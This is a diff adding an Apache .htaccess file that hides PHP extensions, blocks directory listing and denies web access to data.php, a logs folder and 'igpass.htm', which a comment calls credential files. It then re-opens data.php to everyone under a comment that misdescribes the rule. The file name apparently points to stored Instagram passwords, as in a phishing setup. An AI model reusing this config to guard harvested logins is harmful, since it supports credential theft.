@@ -1,0 +1,30 @@
+RewriteEngine On
+
+# Hide PHP extension
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule ^([^\.]+)$ $1.php [NC,L]
+
+# Set default index file
+DirectoryIndex index.php
+
+# Prevent directory listing
+Options -Indexes
+
+# Deny access to sensitive files
+<FilesMatch "^\.">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Restrict direct access to credential files but allow server-side access
+<FilesMatch "^(data\.php|logs/.*|igpass\.htm)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Allow PHP to access igpass.htm
+<Files data.php>
+    Order allow,deny
+    Allow from all
+</Files> 
